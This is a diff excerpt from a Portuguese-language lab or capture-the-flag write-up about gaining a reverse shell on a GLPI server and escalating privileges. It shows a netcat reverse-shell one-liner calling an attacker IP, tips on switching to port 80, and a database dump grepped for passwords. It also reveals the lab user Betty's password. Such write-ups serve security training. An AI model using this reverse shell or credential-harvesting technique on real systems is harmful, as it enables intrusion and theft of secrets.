@@ -121,4 +121,38 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.45.219 80 >/tmp/f
 
 ele não estava sendo codificado corretamente. Foi necessário enviar a requisição para o **Repeater** no **Burp Suite** e codificar o payload corretamente. Após isso, consegui obter uma **reverse shell**.
 
+Depois, analisei novamente a situação, pois não fazia sentido o problema estar acontecendo. Percebi que, provavelmente, eu estava cometendo algum erro (risos). Lembre-se, nem sempre o problema é o exploit; às vezes, é a porta que você está utilizando. Mesmo que você use portas comumente liberadas no firewall, nem todas podem estar disponíveis. No meu caso, a porta 443 não estava liberada, mas a 80 estava. Então, alterei para a porta 80 e a exploração funcionou, obtendo, assim, minha reverse shell.
+
+![image](https://github.com/user-attachments/assets/9eb142be-8cb5-4413-a4c4-07c629f57731)
+
+## Privilege Escalation
+
+Primeiramente, é necessário realizar uma nova fase de reconhecimento, desta vez com foco em escalada de privilégios. O objetivo agora é identificar possíveis pontos vulneráveis que possam ser explorados para elevar os privilégios no sistema. Vamos começar buscando por arquivos de configuração, na tentativa de encontrar senhas ou informações sensíveis que possam ser utilizadas nesse processo.
+
+Se preferir, você pode automatizar essa atividade utilizando ferramentas como o LinPEAS (https://github.com/peass-ng/PEASS-ng) ou o LinEnum (https://github.com/rebootuser/LinEnum).
+
+Pesquisando por arquivos interessantes dentro do próprio diretório, encontrei um arquivo de configuração que continha a senha do banco de dados.
+
+![image](https://github.com/user-attachments/assets/397dd662-afb1-4b9e-b0d8-5e874ebe3c45)
+
+Com essa senha, tentei reutilizá-la para o usuário Betty, mas sem sucesso. Em seguida, tentei acessar o banco de dados e obtive sucesso.
+
+```
+mysql -u glpi -p
+```
+
+Inicialmente, tentei quebrar os hashes encontrados, mas sem sucesso.
+
+![image](https://github.com/user-attachments/assets/c441300e-66ff-47b6-acb7-8b3828ad28a3)
+
+Como seria inviável ler todas as tabelas linha por linha, decidi fazer um dump completo do banco de dados e usar o grep para agilizar o processo.
+
+```
+mysqldump -u glpi -p glpi > glpi_dump.sql
+grep -i 'password' glpi_dump.sql
+```
+
+![image](https://github.com/user-attachments/assets/7dc6861f-85ec-4cb7-af4c-6cd879765602)
+
+Após isso, encontrei a senha SnowboardSkateboardRoller234. Tentei novamente fazer login com o usuário Betty e, desta vez, tive sucesso.
 
